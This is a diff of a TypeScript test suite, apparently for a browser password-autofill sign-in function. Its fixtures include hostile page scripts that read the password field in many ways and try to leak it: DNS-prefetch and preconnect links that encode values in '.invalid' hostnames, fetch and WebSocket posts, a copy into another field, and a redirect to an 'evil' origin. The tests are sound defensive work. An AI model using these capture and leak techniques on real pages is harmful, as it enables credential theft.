@@ -79,6 +79,7 @@ describe(signIn, () => {
         evil: string;
         headers: Record<string, string>;
         home: string;
+        onMoved: (response: ServerResponse) => void;
         onSession: Handler;
         page: string;
         popup: string;
@@ -88,6 +89,7 @@ describe(signIn, () => {
         evil: "",
         headers: {},
         home: "",
+        onMoved: (response) => response.end(),
         onSession: () => undefined,
         page: "",
         popup: "",
@@ -113,6 +115,10 @@ describe(signIn, () => {
             switch (request.url?.split("?", 1)[0]) {
                 case "/home": {
                     html(response, fixture.home);
+                    break;
+                }
+                case "/moved.png": {
+                    fixture.onMoved(response);
                     break;
                 }
                 case "/popup": {
@@ -260,27 +266,115 @@ describe(signIn, () => {
         expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
     });
 
-    it("signs in through a script that posts the login as JSON", async () => {
+    it.each([
+        [
+            "by fetch as JSON",
+            `fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }), method: "POST" });`,
+        ],
+        ["with the password alone", `fetch("/check", { body: document.forms[0].pw.value, method: "POST" });`],
+        [
+            "on a WebSocket",
+            `const socket = new WebSocket("WS/socket"); socket.onopen = () => socket.send(JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }));`,
+        ],
+    ])("reports a script that signs in %s as a sign-in it cannot fill, and sends nothing", async (_how, send) => {
         fixture.page = loginForm(
-            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }), method: "POST" }); });`,
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); ${send.replace("WS", () => login.origin.replace("http", "ws"))} });`,
         );
-        fixture.onSession = (_request, response) => response.end("{}");
 
         const result = await run();
 
-        expect(result).toMatchObject({ submitted: true, success: true });
-        expect(sessionPosts()).toStrictEqual([{ body: JSON.stringify({ pw: SAVED_SECRET, user: "ann" }), method: "POST", url: "/session" }]);
+        expect(result).toMatchObject({ error: expect.stringContaining("signs in with a script"), scriptSignIn: true, submitted: false, success: false });
+        expect(login.hits.filter((hit) => hit.method === "POST" || hit.method === "FRAME 1")).toStrictEqual([]);
     });
 
-    it("signs in through a script that writes a blank frame's document first", async () => {
+    it("signs in when a submit handler writes a blank frame's document first", async () => {
         fixture.page = loginForm(
-            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); const frame = document.createElement("iframe"); document.body.append(frame); frame.contentDocument.open(); frame.contentDocument.write("<p>widget</p>"); frame.contentDocument.close(); await fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }), method: "POST" }); });`,
+            `document.forms[0].addEventListener("submit", () => { const frame = document.createElement("iframe"); document.body.append(frame); frame.contentDocument.open(); frame.contentDocument.write("<p>widget</p>"); frame.contentDocument.close(); });`,
         );
-        fixture.onSession = (_request, response) => response.end("{}");
 
         const result = await run();
 
         expect(result).toMatchObject({ submitted: true, success: true });
+    });
+
+    it("gives page scripts only a stand-in, however they read the field, and sends the password in the form's own POST", async () => {
+        const seen: string[] = [];
+
+        await page.exposeFunction("seen", (values: string[]) => {
+            seen.push(...values);
+        });
+        fixture.page = loginForm(
+            `const form = document.forms[0]; const field = form.pw; const read = []; let keys = "";
+            for (const type of ["beforeinput", "input", "compositionend"]) field.addEventListener(type, (event) => read.push(event.data ?? ""));
+            field.addEventListener("keydown", (event) => { keys += event.key; });
+            form.addEventListener("submit", () => {
+                const frame = document.createElement("iframe"); document.body.append(frame);
+                read.push(keys, field.value, form.elements.pw.value, String(new FormData(form).get("pw")), field.getAttribute("value") ?? "", Object.getOwnPropertyDescriptor(frame.contentWindow.HTMLInputElement.prototype, "value").get.call(field), structuredClone(field.value));
+                field.setSelectionRange(0, field.value.length); read.push(field.value.slice(field.selectionStart, field.selectionEnd));
+                for (const value of read) for (const rel of ["preconnect", "dns-prefetch"]) document.head.append(Object.assign(document.createElement("link"), { href: "http://" + encodeURIComponent(value || "empty") + ".invalid", rel }));
+                window.seen(read);
+            });`,
+        );
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true });
+        expect(seen.filter((value) => value.length >= 16)).not.toHaveLength(0);
+        expect(seen.filter((value) => value.includes(SAVED_SECRET))).toStrictEqual([]);
+        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
+    });
+
+    it.each([
+        [
+            "copies the stand-in into the username field",
+            `document.forms[0].addEventListener("submit", () => { document.forms[0].user.value = document.forms[0].pw.value; });`,
+        ],
+        [
+            "posts it in a form of its own to another address of the site",
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const form = Object.assign(document.createElement("form"), { action: "/profile", method: "post" }); form.append(Object.assign(document.createElement("input"), { name: "pw", value: document.forms[0].pw.value })); document.body.append(form); form.submit(); });`,
+        ],
+    ])("sends no password when the page %s", async (_what, script) => {
+        fixture.page = loginForm(script);
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("changed the password field"), submitted: false, success: false });
+        expect(login.hits.filter((hit) => hit.body.includes(SAVED_SECRET))).toStrictEqual([]);
+    });
+
+    it("runs no script of the sign-in's answer, which could read what the site shows of it", async () => {
+        fixture.page = loginForm();
+        fixture.home = `<h1>Home</h1><script>fetch("/ran");</script>`;
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true });
+        // The answer, then the cleanup's reload, whose script runs once the lock is lifted.
+        expect(login.hits.filter((hit) => ["/home", "/ran"].includes(hit.url)).map((hit) => hit.url)).toStrictEqual(["/home", "/home", "/ran"]);
+    });
+
+    it("sends the password in a multipart form's own POST", async () => {
+        fixture.page = loginForm("", 'method="post" action="/session" enctype="multipart/form-data"');
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true });
+        expect(sessionPosts()[0]?.body).toContain(`name="pw"\r\n\r\n${SAVED_SECRET}\r\n`);
+    });
+
+    it("signs in when an image of the login's site redirects to another site by 307", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].pw.addEventListener("input", () => document.body.append(Object.assign(document.createElement("img"), { src: "/moved.png" })));`,
+        );
+        fixture.onMoved = (response) => {
+            response.writeHead(307, { location: `${evil.origin}/cdn.png` });
+            response.end();
+        };
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true });
+        expect(login.hits.some((hit) => hit.url === "/moved.png")).toBe(true);
     });
 
     it("waits for a slow server's answer before it reports where the form landed", async () => {
@@ -376,17 +470,6 @@ describe(signIn, () => {
         expect(await passwordLeft()).toBe(false);
     });
 
-    it("tells the caller to close the session when the password cannot be cleared", async () => {
-        // The page keeps what was typed and puts it back on every load.
-        fixture.page = loginForm(
-            `const field = document.forms[0].pw; field.value = localStorage.getItem("p") ?? ""; field.addEventListener("input", () => { if (field.value) localStorage.setItem("p", field.value); }); document.forms[0].addEventListener("submit", (event) => event.preventDefault());`,
-        );
-
-        const result = await run();
-
-        expect(result).toStrictEqual({ error: expect.stringContaining("session was closed"), sessionClosed: true, submitted: false, success: false });
-    });
-
     it("reports a form the page held back as not sent", async () => {
         fixture.page = loginForm(`document.forms[0].addEventListener("submit", (event) => event.preventDefault());`);
 
@@ -441,9 +524,19 @@ describe(signIn, () => {
             offset = 60_000;
         });
         fixture.page = loginForm();
-        fixture.home = `<h1>Home</h1><script>window.endHold();</script>`;
+        // The answer runs no script: the site ends the hold as it serves it.
+        Object.defineProperty(fixture, "home", {
+            configurable: true,
+            get: () => {
+                offset = 60_000;
+
+                return "<h1>Home</h1>";
+            },
+        });
 
         const result = await run(() => Date.now() + offset);
+
+        Reflect.deleteProperty(fixture, "home");
 
         expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
         expect(page.isClosed()).toBe(true);
@@ -496,11 +589,10 @@ describe(signIn, () => {
         expect(page.isClosed()).toBe(true);
     });
 
-    it.each([
-        ["a beacon of the whole form", `navigator.sendBeacon("/beacon", new FormData(document.forms[0]));`],
-        ["a fetch with the password alone", `fetch("/check", { body: document.forms[0].pw.value, method: "POST" });`],
-    ])("does not count %s as the sign-in", async (_what, send) => {
-        fixture.page = loginForm(`document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); ${send} });`);
+    it("does not count a beacon of the whole form as the sign-in", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); navigator.sendBeacon("/beacon", new FormData(document.forms[0])); });`,
+        );
 
         const result = await run();
 
@@ -519,17 +611,6 @@ describe(signIn, () => {
 
         expect(result).toMatchObject({ error: expect.stringContaining("WebSocket"), submitted: false, success: false });
         expect([...evil.hits, ...login.hits].filter((hit) => hit.method === "WEBSOCKET")).toStrictEqual([]);
-    });
-
-    it("counts a login a script sends on a WebSocket to the login's site as sent", async () => {
-        fixture.page = loginForm(
-            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const socket = new WebSocket("${login.origin.replace("http", "ws")}/socket"); socket.onopen = () => socket.send(JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value })); });`,
-        );
-
-        const result = await run();
-
-        expect(result).toMatchObject({ submitted: true });
-        expect(login.hits.filter((hit) => hit.method === "FRAME 1")).toHaveLength(1);
     });
 
     it("closes a WebSocket to another site the page opened before the password was typed", async () => {
@@ -784,15 +865,15 @@ describe(signIn, () => {
         expect(context.pages()).toStrictEqual([page]);
     });
 
-    it("counts the form's own POST as sent when the page re-encodes the password first", async () => {
+    it("does not send the form when the page re-encodes the password first", async () => {
         fixture.page = loginForm(
             `document.forms[0].addEventListener("submit", () => { const field = document.forms[0].pw; field.value = [...field.value].reverse().join(""); });`,
         );
 
         const result = await run();
 
-        expect(result).toMatchObject({ submitted: true, success: true });
-        expect(sessionPosts()).toHaveLength(1);
+        expect(result).toMatchObject({ error: expect.stringContaining("changed the password field"), submitted: false, success: false });
+        expect(sessionPosts()).toStrictEqual([]);
     });
 
     it("stops waiting on a submit handler that does not return", async () => {
